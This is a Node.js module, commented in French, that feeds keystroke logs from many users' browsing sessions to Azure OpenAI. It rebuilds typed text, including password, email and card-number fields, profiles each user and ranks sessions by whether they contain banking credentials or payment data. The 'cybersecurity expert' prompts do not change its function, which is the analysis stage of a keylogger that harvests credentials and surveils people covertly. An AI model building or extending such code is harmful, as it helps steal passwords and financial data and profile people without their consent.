// AI Analysis Module - Azure OpenAI Integration
const axios = require('axios');
require('dotenv').config();

// Configuration Azure OpenAI
const AZURE_CONFIG = {
    endpoint: process.env.AZURE_OPENAI_ENDPOINT || 'https://your-resource.cognitiveservices.azure.com/',
    apiKey: process.env.AZURE_OPENAI_API_KEY || 'your-api-key',
    deploymentName: process.env.AZURE_OPENAI_DEPLOYMENT || 'gpt-4',
    apiVersion: process.env.AZURE_OPENAI_API_VERSION || '2024-02-15-preview'
};

// Fonction pour appeler Azure OpenAI
async function callAzureOpenAI(messages, maxTokens = 1000) {
    try {
        const url = `${AZURE_CONFIG.endpoint}openai/deployments/${AZURE_CONFIG.deploymentName}/chat/completions?api-version=${AZURE_CONFIG.apiVersion}`;

        const response = await axios.post(url, {
            messages: messages,
            max_tokens: maxTokens,
            temperature: 0.7,
            top_p: 0.95
        }, {
            headers: {
                'Content-Type': 'application/json',
                'api-key': AZURE_CONFIG.apiKey
            }
        });

        return response.data.choices[0].message.content;
    } catch (error) {
        console.error('Erreur Azure OpenAI:', error.response?.data || error.message);
        throw error;
    }
}

// Analyser un utilisateur et créer un persona
async function analyzeUserPersona(user) {
    // Vérifier qu'il y a assez de données
    if (!user.sessions || user.sessions.length < 2) {
        console.log(`ℹ️  Pas assez de sessions pour ${user.userId} (${user.sessions?.length || 0}), retour persona par défaut`);
        return {
            persona: {
                nom: "Utilisateur Nouveau",
                description: "Utilisateur récent avec peu d'activité",
                traits: ["Nouveau", "En exploration"]
            },
            comportement: {
                typeUtilisateur: "nouveau",
                activitéPrincipale: "Navigation initiale",
                heuresActivité: "Variable"
            },
            intérêts: ["Découverte"],
            insights: ["Pas encore assez de données pour une analyse complète"],
            résumé: "Utilisateur récent, attendez plus d'activité pour une analyse détaillée."
        };
    }

    try {
        // Préparer les données pour l'analyse
        const sessionsData = user.sessions.map(s => ({
            url: s.url,
            title: s.title,
            keystrokesCount: s.keystrokes.length,
            duration: Math.round((new Date(s.endTime) - new Date(s.startTime)) / 1000),
            timestamp: s.startTime,
            hasSensitiveData: s.sensitiveData || null,
            sensitivityLevel: s.sensitivityLevel || 'low'
        }));

        // Extraire les sites les plus visités
        const sitesFrequency = {};
        user.sessions.forEach(s => {
            try {
                const hostname = new URL(s.url).hostname;
                sitesFrequency[hostname] = (sitesFrequency[hostname] || 0) + 1;
            } catch (e) { }
        });

        const topSites = Object.entries(sitesFrequency)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 10)
            .map(([site, count]) => `${site} (${count} visites)`);

        // Détecter les sessions sensibles
        const sensitiveSessions = user.sessions.filter(s => 
            s.sensitivityScore > 50 || s.sensitiveData?.hasPassword
        );

        // Créer le prompt pour l'IA
        const prompt = `Analyse les données d'activité web suivantes et crée un persona détaillé de l'utilisateur.

DONNÉES UTILISATEUR:
- ID: ${user.userId}
- Première activité: ${user.firstSeen}
- Dernière activité: ${user.lastSeen}
- Total sessions: ${user.totalSessions}
- Total touches: ${user.totalKeystrokes}
- Sessions sensibles: ${sensitiveSessions.length}

TOP 10 SITES VISITÉS:
${topSites.join('\n')}

SESSIONS RÉCENTES (${Math.min(5, user.sessions.length)} dernières):
${JSON.stringify(sessionsData.slice(-5), null, 2)}

Génère une analyse structurée en JSON avec:
{
  "persona": {
    "nom": "Un nom de persona créatif",
    "description": "Description courte du profil",
    "traits": ["trait1", "trait2", "trait3"]
  },
  "comportement": {
    "typeUtilisateur": "professionnel/étudiant/casual/etc",
    "activitéPrincipale": "description de l'activité principale",
    "heuresActivité": "matin/après-midi/soir/nuit"
  },
  "intérêts": ["intérêt1", "intérêt2", "intérêt3"],
  "insights": [
    "Insight 1 sur le comportement",
    "Insight 2 sur les habitudes",
    "Insight 3 sur les préférences"
  ],
  "résumé": "Un résumé en 2-3 phrases du profil utilisateur"
}

Sois précis et basé sur les données réelles. Réponds UNIQUEMENT avec le JSON, sans texte supplémentaire.`;

        const messages = [
            {
                role: 'system',
                content: 'Tu es un expert en analyse de comportement utilisateur. Tu analyses les données de navigation web pour créer des personas détaillés et des insights comportementaux.'
            },
            {
                role: 'user',
                content: prompt
            }
        ];

        const response = await callAzureOpenAI(messages, 1500);

        // Parser la réponse JSON
        const jsonMatch = response.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
            return JSON.parse(jsonMatch[0]);
        }

        return JSON.parse(response);
    } catch (error) {
        console.error('❌ Erreur analyse persona:', error.message);
        
        // Retourner un persona par défaut en cas d'erreur
        return {
            persona: {
                nom: "Analyse Indisponible",
                description: "L'analyse IA n'a pas pu être complétée",
                traits: ["Utilisateur actif"]
            },
            comportement: {
                typeUtilisateur: "utilisateur",
                activitéPrincipale: "Navigation web",
                heuresActivité: "Variable"
            },
            intérêts: ["Navigation", "Web"],
            insights: [
                `${user.totalSessions} sessions enregistrées`,
                `${user.totalKeystrokes} touches capturées`,
                "Analyse IA temporairement indisponible - vérifiez votre clé API Azure"
            ],
            résumé: `Utilisateur avec ${user.totalSessions} sessions. L'analyse complète nécessite une connexion IA fonctionnelle.`
        };
    }
}

// Générer un résumé de session
async function generateSessionSummary(session) {
    try {
        // Reconstruire le texte tapé
        let text = '';
        session.keystrokes.forEach(k => {
            if (k.key.length === 1 && !k.isSpecialKey) {
                text += k.key;
            } else if (k.key === 'Backspace' && text.length > 0) {
                text = text.slice(0, -1);
            } else if (k.key === 'Enter') {
                text += '\n';
            } else if (k.key === ' ') {
                text += ' ';
            }
        });

        const prompt = `Analyse cette session de navigation web et génère un résumé concis.

URL: ${session.url}
Titre: ${session.title}
Durée: ${Math.round((new Date(session.endTime) - new Date(session.startTime)) / 1000)} secondes
Touches tapées: ${session.keystrokes.length}

Texte saisi (extrait):
${text.substring(0, 500)}

Génère un résumé en 1-2 phrases de ce que l'utilisateur a fait sur cette page.
Réponds UNIQUEMENT avec le résumé, sans introduction.`;

        const messages = [
            {
                role: 'system',
                content: 'Tu es un assistant qui résume les activités de navigation web de manière concise et claire.'
            },
            {
                role: 'user',
                content: prompt
            }
        ];

        return await callAzureOpenAI(messages, 200);
    } catch (error) {
        console.error('Erreur génération résumé:', error);
        return "Résumé non disponible";
    }
}

// Analyser une session pour déterminer son type (credentials, search, form, etc.)
async function analyzeSessionType(session) {
    try {
        // Reconstruire le texte tapé
        let text = '';
        session.keystrokes.forEach(k => {
            if (k.key.length === 1 && !k.isSpecialKey) {
                text += k.key;
            } else if (k.key === 'Backspace' && text.length > 0) {
                text = text.slice(0, -1);
            } else if (k.key === 'Enter') {
                text += '\n';
            } else if (k.key === ' ') {
                text += ' ';
            }
        });

        // Détecter les métadonnées des inputs
        const hasPasswordInput = session.keystrokes.some(k => 
            k.inputMetadata && k.inputMetadata.type === 'password'
        );
        const hasEmailInput = session.keystrokes.some(k => 
            k.inputMetadata && (k.inputMetadata.type === 'email' || k.inputMetadata.name?.includes('email'))
        );
        const hasSearchInput = session.keystrokes.some(k => 
            k.inputMetadata && (k.inputMetadata.type === 'search' || k.inputMetadata.name?.includes('search') || k.inputMetadata.name?.includes('q'))
        );

        const prompt = `Analyse cette session de navigation et catégorise-la.

URL: ${session.url}
Titre: ${session.title}
Texte saisi: ${text.substring(0, 300) || '(aucun texte)'}
Champs détectés:
- Mot de passe: ${hasPasswordInput ? 'OUI' : 'NON'}
- Email: ${hasEmailInput ? 'OUI' : 'NON'}
- Recherche: ${hasSearchInput ? 'OUI' : 'NON'}

Catégorise cette session et fournis une analyse en JSON:
{
  "type": "credentials|search|form|navigation|social|shopping|work|other",
  "category": "Nom de la catégorie",
  "description": "Description courte de l'activité",
  "keywords": ["mot-clé1", "mot-clé2"],
  "isPasswordEntry": boolean,
  "containsCredentials": boolean,
  "intention": "Ce que l'utilisateur cherchait à faire"
}

Réponds UNIQUEMENT avec le JSON, sans texte supplémentaire.`;

        const messages = [
            {
                role: 'system',
                content: 'Tu es un expert en analyse de comportement web. Tu catégorises les sessions de navigation pour identifier les intentions utilisateur.'
            },
            {
                role: 'user',
                content: prompt
            }
        ];

        const response = await callAzureOpenAI(messages, 300);
        
        // Parser la réponse JSON
        const jsonMatch = response.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
            return JSON.parse(jsonMatch[0]);
        }
        return JSON.parse(response);
    } catch (error) {
        console.error('Erreur analyse session:', error);
        return {
            type: 'other',
            category: 'Non analysé',
            description: 'Analyse non disponible',
            keywords: [],
            isPasswordEntry: false,
            containsCredentials: false,
            intention: 'Indéterminé'
        };
    }
}

// Analyser les tendances globales
async function analyzeGlobalTrends(users) {
    try {
        const totalSessions = users.reduce((sum, u) => sum + u.totalSessions, 0);
        const totalKeystrokes = users.reduce((sum, u) => sum + u.totalKeystrokes, 0);

        // Extraire tous les sites visités
        const allSites = {};
        users.forEach(user => {
            user.sessions.forEach(s => {
                try {
                    const hostname = new URL(s.url).hostname;
                    allSites[hostname] = (allSites[hostname] || 0) + 1;
                } catch (e) { }
            });
        });

        const topGlobalSites = Object.entries(allSites)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 15)
            .map(([site, count]) => `${site}: ${count} visites`);

        const prompt = `Analyse ces données d'utilisation web globales et génère des insights.

STATISTIQUES:
- Nombre d'utilisateurs: ${users.length}
- Total sessions: ${totalSessions}
- Total touches: ${totalKeystrokes}
- Moyenne sessions/utilisateur: ${(totalSessions / users.length).toFixed(1)}

TOP 15 SITES GLOBAUX:
${topGlobalSites.join('\n')}

Génère une analyse en JSON:
{
  "tendances": ["tendance1", "tendance2", "tendance3"],
  "catégoriesPrincipales": ["catégorie1", "catégorie2"],
  "insights": ["insight1", "insight2", "insight3"],
  "recommandations": ["recommandation1", "recommandation2"]
}

Réponds UNIQUEMENT avec le JSON.`;

        const messages = [
            {
                role: 'system',
                content: 'Tu es un analyste de données web qui identifie les tendances et patterns d\'utilisation.'
            },
            {
                role: 'user',
                content: prompt
            }
        ];

        const response = await callAzureOpenAI(messages, 800);
        const jsonMatch = response.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
            return JSON.parse(jsonMatch[0]);
        }
        return JSON.parse(response);
    } catch (error) {
        console.error('Erreur analyse tendances:', error);
        return {
            tendances: [],
            catégoriesPrincipales: [],
            insights: [],
            recommandations: []
        };
    }
}

// Analyser les données en fonction de l'URL pour détecter les informations critiques
async function analyzeDataByURL(session) {
    try {
        // Extraire le domaine et l'URL
        let domain = '';
        try {
            const url = new URL(session.url);
            domain = url.hostname.replace('www.', '');
        } catch (e) {
            domain = session.url;
        }

        // Reconstruire le texte tapé
        let text = '';
        session.keystrokes.forEach(k => {
            if (k.key.length === 1 && !k.isSpecialKey) {
                text += k.key;
            } else if (k.key === 'Backspace' && text.length > 0) {
                text = text.slice(0, -1);
            } else if (k.key === 'Enter') {
                text += '\n';
            } else if (k.key === ' ') {
                text += ' ';
            }
        });

        // Détecter les métadonnées critiques
        const hasPasswordInput = session.keystrokes.some(k => 
            k.inputMetadata && k.inputMetadata.type === 'password'
        );
        const hasEmailInput = session.keystrokes.some(k => 
            k.inputMetadata && (k.inputMetadata.type === 'email' || k.inputMetadata.name?.includes('email'))
        );
        const hasCreditCardInput = session.keystrokes.some(k => 
            k.inputMetadata && (k.inputMetadata.name?.includes('card') || k.inputMetadata.name?.includes('cc'))
        );

        const prompt = `Tu es un expert en cybersécurité. Analyse cette session web et corrèle les données saisies avec le contexte de l'URL pour identifier les informations critiques.

DOMAINE: ${domain}
URL COMPLÈTE: ${session.url}
TITRE PAGE: ${session.title}

DONNÉES SAISIES:
${text.substring(0, 500) || '(aucune donnée)'}

MÉTADONNÉES DÉTECTÉES:
- Champ mot de passe: ${hasPasswordInput ? 'OUI ⚠️' : 'NON'}
- Champ email: ${hasEmailInput ? 'OUI ⚠️' : 'NON'}
- Champ carte bancaire: ${hasCreditCardInput ? 'OUI ⚠️' : 'NON'}

ANALYSE REQUISE:
Identifie le type de site (banking, social media, e-commerce, email, corporate, etc.) et corrèle avec les données saisies pour détecter:
1. Les credentials (logins, passwords)
2. Les données financières (cartes, virements)
3. Les informations personnelles sensibles
4. Les recherches critiques
5. Les formulaires importants

Réponds en JSON avec cette structure EXACTE:
{
  "siteType": "banking|social|ecommerce|email|corporate|search|other",
  "siteName": "Nom identifiable du site",
  "riskLevel": "critical|high|medium|low",
  "dataType": "credentials|payment|personal|search|form|navigation",
  "highlightReason": "Explication claire pourquoi ces données sont importantes",
  "detectedData": {
    "hasCredentials": boolean,
    "hasPaymentInfo": boolean,
    "hasPersonalInfo": boolean,
    "hasSensitiveSearch": boolean
  },
  "securityConcern": "Description du risque de sécurité potentiel",
  "recommendations": ["conseil1", "conseil2"],
  "shouldHighlight": boolean,
  "tags": ["tag1", "tag2", "tag3"]
}

Réponds UNIQUEMENT avec le JSON, sans texte supplémentaire.`;

        const messages = [
            {
                role: 'system',
                content: 'Tu es un expert en cybersécurité spécialisé dans l\'analyse de données web et la détection de risques. Tu corrèles les URLs avec les données saisies pour identifier les informations critiques.'
            },
            {
                role: 'user',
                content: prompt
            }
        ];

        const response = await callAzureOpenAI(messages, 600);
        
        // Parser la réponse JSON
        const jsonMatch = response.match(/\{[\s\S]*\}/);
        if (jsonMatch) {
            const analysis = JSON.parse(jsonMatch[0]);
            console.log(`✅ Corrélation URL pour ${domain}:`, analysis.shouldHighlight ? '🔥 HIGHLIGHT' : '✓ Normal');
            return analysis;
        }
        return JSON.parse(response);
    } catch (error) {
        console.error('❌ Erreur corrélation URL:', error.message);
        return {
            siteType: 'other',
            siteName: 'Site inconnu',
            riskLevel: 'low',
            dataType: 'navigation',
            highlightReason: 'Analyse non disponible',
            detectedData: {
                hasCredentials: false,
                hasPaymentInfo: false,
                hasPersonalInfo: false,
                hasSensitiveSearch: false
            },
            securityConcern: 'Analyse temporairement indisponible',
            recommendations: [],
            shouldHighlight: false,
            tags: ['non-analysé']
        };
    }
}

module.exports = {
    analyzeUserPersona,
    generateSessionSummary,
    analyzeSessionType,
    analyzeGlobalTrends,
    analyzeDataByURL
};
